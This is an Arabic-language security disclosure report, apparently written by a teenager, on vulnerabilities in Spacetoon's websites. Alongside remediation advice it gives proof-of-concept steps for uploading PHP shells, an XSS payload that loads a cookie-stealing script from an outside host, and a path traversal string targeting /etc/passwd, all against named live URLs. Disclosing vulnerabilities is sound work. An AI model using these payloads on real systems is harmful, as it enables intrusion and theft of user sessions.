# تقرير شامل عن الأخطاء والثغرات الأمنية في المواقع

## المقدمة

السلام عليكم ورحمة الله وبركاته،

أنا شاهين أمجد، عمري 16 عامًا. لقد فكرت في تقديم هدية بسيطة جدًا لكم تقديرًا للذكريات والعبر الجميلة التي قدمتموها لنا. حتى في عمري هذا، لا زلت أحن للمسلسلات الكرتونية والأنمي القديم مثل "القناص" في جزئه الأول.

الهدية التي أقدمها هي عبارة عن فصل شامل قمت به بكل مهاراتي لفحص مواقعكم على الإنترنت كوسيلة شكر لكم ولحماية مواقعكم من الهجمات التي يمكن أن تسبب ضررًا كبيرًا.

### الملاحظات
منذ الصغر كان هذا حلمي وقد تحقق بفضل الله. التالي هو تقرير شامل عن كل ما فحصته والثغرات التي وجدتها. أتمنى أن أكون قد شرحت بطريقة واضحة ومفهومة لكم. ❤️

---


---

## جدول المحتويات

1. [الملفات الضارة المؤرشفة](#الملفات-الضارة-المؤرشفة)
2. [مشكلة تسجيل الدخول باستخدام OAuth](#مشكلة-تسجيل-الدخول-باستخدام-oauth)
3. [ثغرة النقر المخادع (Clickjacking)](#ثغرة-النقر-المخادع-clickjacking)
4. [ثغرة رفع الملفات](#ثغرة-رفع-الملفات)
5. [مشكلة تسجيل الخروج](#مشكلة-تسجيل-الخروج)
6. [مشكلة استعادة كلمة المرور](#مشكلة-استعادة-كلمة-المرور)
7. [غياب جدار حماية WAF على موقع "moshaya.spacetoon.com"](#غياب-جدار-حماية-waf-على-موقع-moshayaspacetooncom)
8. [ثغرة XSS - البرمجة النصية عبر المواقع](#ثغرة-xss---البرمجة-النصية-عبر-المواقع)
9. [ثغرة Laravel - استغلال المسارات](#ثغرة-laravel---استغلال-المسارات)

---

## 1. الملفات الضارة المؤرشفة

### الوصف
تم العثور على ملفات PHP ضارة (مثل `c99shell`) في موقع [webarchive.org](https://web.archive.org). هذه الملفات تمنح المهاجم سيطرة كاملة على الموقع وقاعدة البيانات.

### التأثير
إذا كانت هذه الملفات لا تزال قابلة للوصول أو تم إعادة توجيهها، فقد يؤدي ذلك إلى اختراق كامل للموقع.

### التوصيات
- إجراء تدقيق شامل لنظام الملفات لضمان عدم وجود ملفات ضارة.
- تطبيق نظام مراقبة سلامة الملفات.
- استخدام حلول حماية متقدمة مثل أنظمة كشف التسلل (EDR).

**الروابط المتأثرة (أرشيفية):**
https://web.archive.org/web/20140623035444*/http://www.spacetoon.com:80/spacetoon/docroot/TempUserFiles/Image/1399881053461.php
https://web.archive.org/web/20140623044436*/http://www.spacetoon.com:80/spacetoon/docroot/TempUserFiles/Image/1399883407116.php
https://web.archive.org/web/20140623050300*/http://www.spacetoon.com:80/spacetoon/docroot/TempUserFiles/Image/1399882361461.php
https://web.archive.org/web/20140623051834*/http://www.spacetoon.com:80/spacetoon/docroot/TempUserFiles/Image/1399880976139.php
https://web.archive.org/web/20140623184338*/http://www.spacetoon.com:80/spacetoon/docroot/TempUserFiles/Image/1399882442574.php
https://web.archive.org/web/20141220164849*/http://www.spacetoon.com:80/spacetoon/docroot/TempUserFiles/Image/1399880756732.php

---

## 2. مشكلة تسجيل الدخول باستخدام OAuth

### الوصف
تظهر رسالة خطأ "400" عند محاولة تسجيل الدخول باستخدام Google أو Facebook.

### التأثير
قد تمنع هذه المشكلة المستخدمين من تسجيل الدخول، مما يؤدي إلى فقدانهم وثقتهم بالموقع.

### التوصيات
- تصحيح الأخطاء في عملية تبادل الرموز OAuth.
- ضمان تأمين رموز JWT لمنع الثغرات الأمنية.

"ارجو ان تعلموني اذا اصلحتم الخطا لان ذلك سيصنع نوعاة حديدا من ملفات تعريف الارتباط التي تسمى ب jwt والتي قد تحتوي على المثير من الثغرات ايضاً وقد تطول للاستيلاء على حسابات المستخدمين"

---

## 3. ثغرة النقر المخادع (Clickjacking)

### الوصف
يمكن استغلال هذه الثغرة لإخفاء عناصر واجهة المستخدم وجعل المستخدم ينقر على أزرار دون علمه.

### التأثير
قد يتم تسجيل خروج المستخدمين أو تنفيذ إجراءات حساسة أخرى دون علمهم.

### التوصيات
- إضافة عنوان HTTP مثل `X-Frame-Options: DENY` أو `Content-Security-Policy: frame-ancestors 'none'`.

**الروابط المتأثرة:**  
- `https://blog.spacetoon.com`

---

## 4. ثغرة رفع الملفات

### الوصف
ميزة رفع الملفات لا تقيّد أنواع الملفات، مما يسمح برفع ملفات ضارة مثل `.php`.

### التأثير
يمكن للمهاجم رفع أدوات اختراق مثل `c99shell` والسيطرة الكاملة على الخادم.

### إثبات المفهوم (PoC)
1. الدخول إلى `https://blog.spacetoon.com/usercp/artical/add`.
2. رفع ملف `.php` في خانة اختيار الصور.
3. تنفيذ السكربت الضار.

### التوصيات
- تقييد أنواع الملفات المسموح برفعها إلى أنواع محددة.
- فحص الملفات المرفوعة باستخدام برامج مكافحة الفيروسات.
- تخزين الملفات المرفوعة خارج مجلدات الموقع العامة.

---

## 5. مشكلة تسجيل الخروج

### الوصف
الرابط `https://blog.spacetoon.com/logout` يقوم بتسجيل خروج المستخدم مباشرة عند الوصول إليه.

### التأثير
يمكن للمهاجم استغلال هذا عبر إرسال روابط مشفرة تسبب تسجيل الخروج للمستخدمين.

### التوصيات
- إضافة نافذة تأكيد قبل تسجيل الخروج.
- استخدام رموز CSRF للتحقق من طلبات تسجيل الخروج.

---

## 6. مشكلة استعادة كلمة المرور

### الوصف
عملية استعادة كلمة المرور تتوقف دون إكمال، مما يجعل المستخدم غير قادر على استعادة حسابه.

### التأثير
قد يؤدي ذلك إلى تجربة سيئة للمستخدمين وفقدان ثقتهم بالموقع.

### التوصيات
- تصحيح الأخطاء في وظيفة استعادة كلمة المرور.
- تطبيق نظام مراقبة وتحليل الأخطاء لتحديد السبب.

---

## 7. غياب جدار حماية WAF على موقع "moshaya.spacetoon.com"

### الوصف
الموقع لا يحتوي على جدار حماية للتطبيقات (WAF)، مما يجعله عرضة لهجمات DDoS وSQL Injection.

### التأثير
زيادة خطر الهجمات وتعطيل الخدمة.

### التوصيات
- نشر جدار حماية مثل (Cloudflare أو AWS WAF).
- إجراء اختبارات اختراق دورية للكشف عن نقاط الضعف.

---

## 8. ثغرة XSS - البرمجة النصية عبر المواقع

### الوصف
تسمح الثغرة بحقن أكواد JavaScript وHTML عبر إدخال المستخدم، مما يمكن من سرقة جلسات المستخدمين.
```html
<script>alert(“You are hacked”)</script>
```
ستظهر كلمه You are hacked للمستخدم ومن الطبيعي ان يخاف

### إثبات المفهوم (PoC)
الكود المستخدم:  
```html
<script src="https://xss.report/c/shaheen101sec"></script>
```
**الخطوات:**  
1. إضافة الكود الضار في مقالة منشأة من المستخدم.
2. مراقبة تنفيذ الكود وسرقة ملفات تعريف الارتباط.

### التأثير
يمكن للمهاجمين السيطرة على حسابات المستخدمين من خلال سرقة ملفات تعريف الارتباط (Cookies).

### التوصيات
- تنظيف جميع إدخالات المستخدم.
- استخدام رؤوس أمان مثل `Content-Security-Policy: default-src 'self';`.

---

## 9. ثغرة Laravel - استغلال المسارات

### الوصف
يكشف إطار العمل Laravel عن مسارات حساسة عند محاولة استغلال ثغرة استعراض المسارات (Path Traversal).

**مثال:**  
`/public/admin/voyager-assets?path=../../etc/passwd`

### التأثير
تسريب تكوينات الخادم والأكواد الخلفية يعرض الموقع لمزيد من المخاطر.

### التوصيات
- منع استعراض المسارات عبر التحقق من إدخالات المستخدم.
- تعيين `APP_DEBUG` إلى `false` في بيئة الإنتاج.

---

**اقتراحات:**  
هل تريد المزيد من الإرشادات لتطبيق الحلول المقترحة مثل نشر جدار الحماية أو تحسين أمان إدخال البيانات؟ لا تتردد في السؤال!
```
